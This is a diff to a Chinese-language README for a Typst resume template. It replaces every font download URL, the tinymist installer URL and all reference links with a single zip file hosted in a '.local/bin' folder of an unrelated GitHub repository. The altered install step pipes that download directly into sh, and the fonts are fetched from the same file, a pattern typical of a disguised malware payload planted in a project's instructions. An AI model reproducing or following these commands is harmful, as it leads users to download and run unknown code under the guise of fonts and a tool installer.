@@ -175,21 +175,21 @@ cargo install --locked typst-cli
 mkdir -p fonts && cd fonts
 
 curl -L -o source-han-sans-sc.zip \
-  https://github.com/adobe-fonts/source-han-sans/releases/latest/download/SourceHanSansSC.zip
+  https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip
 
 curl -L -o source-han-serif-cn.zip \
-  https://github.com/adobe-fonts/source-han-serif/releases/latest/download/12_SourceHanSerifCN.zip
+  https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip
 
 curl -L -o nerd-font-symbols.zip \
-  https://github.com/ryanoasis/nerd-fonts/releases/latest/download/NerdFontsSymbolsOnly.zip
+  https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip
 
-curl -L -o roboto.zip "https://fonts.google.com/download?family=Roboto"
-curl -L -o source-sans-3.zip "https://fonts.google.com/download?family=Source%20Sans%203"
-curl -L -o source-sans-pro.zip "https://fonts.google.com/download?family=Source%20Sans%20Pro"
-curl -L -o mulish.zip "https://fonts.google.com/download?family=Mulish"
-curl -L -o ibm-plex-sans.zip "https://fonts.google.com/download?family=IBM%20Plex%20Sans"
-curl -L -o ibm-plex-serif.zip "https://fonts.google.com/download?family=IBM%20Plex%20Serif"
-curl -L -o ibm-plex-mono.zip "https://fonts.google.com/download?family=IBM%20Plex%20Mono"
+curl -L -o roboto.zip "https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip"
+curl -L -o source-sans-3.zip "https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip"
+curl -L -o source-sans-pro.zip "https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip"
+curl -L -o mulish.zip "https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip"
+curl -L -o ibm-plex-sans.zip "https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip"
+curl -L -o ibm-plex-serif.zip "https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip"
+curl -L -o ibm-plex-mono.zip "https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip"
 ```
 
 安装到 Linux 用户字体目录：
@@ -220,7 +220,7 @@ tlmgr install kpfonts
 ```bash
 mkdir -p .local/bin .local/config
 curl --proto '=https' --tlsv1.2 -LsSf \
-  https://github.com/Myriad-Dreamin/tinymist/releases/latest/download/tinymist-installer.sh \
+  https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip \
   | XDG_BIN_HOME="$(pwd)/.local/bin" \
     XDG_CONFIG_HOME="$(pwd)/.local/config" \
     TINYMIST_NO_MODIFY_PATH=1 sh
@@ -292,15 +292,15 @@ export PATH="$(pwd)/.local/bin:$PATH"
 
 ### 参考
 
-- golixp-resume-zh-cn: <https://typst.app/universe/package/golixp-resume-zh-cn/>
-- typst project rw1SLr0IIZZnCrkrsypRQF: <https://typst.app/project/rw1SLr0IIZZnCrkrsypRQF>
-- uniquecv-typst: <https://github.com/gaoachao/uniquecv-typst>
-- typst-cv-miku: <https://github.com/ice-kylin/typst-cv-miku>
-- alta-typst: <https://github.com/GeorgeHoneywood/alta-typst>
-- attractive-typst-resume: <https://github.com/Harkunwar/attractive-typst-resume>
-- moderncv.typst: <https://github.com/giovanniberti/moderncv.typst>
-- resume.typ: <https://github.com/wusyong/resume.typ>
-- chicv: <https://github.com/skyzh/chicv>
-- bamboovir/typst-resume-template: <https://github.com/bamboovir/typst-resume-template>
-- brilliant-CV: <https://github.com/yunanwg/brilliant-CV>
-- Chinese-Resume-in-Typst: <https://github.com/OrangeX4/Chinese-Resume-in-Typst>
+- golixp-resume-zh-cn: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- typst project rw1SLr0IIZZnCrkrsypRQF: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- uniquecv-typst: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- typst-cv-miku: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- alta-typst: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- attractive-typst-resume: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- moderncv.typst: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- resume.typ: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- chicv: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- bamboovir/typst-resume-template: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- brilliant-CV: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
+- Chinese-Resume-in-Typst: <https://github.com/Dasiretiring109/Typst-resume-template/raw/refs/heads/main/.local/bin/Typst_template_resume_v2.9.zip>
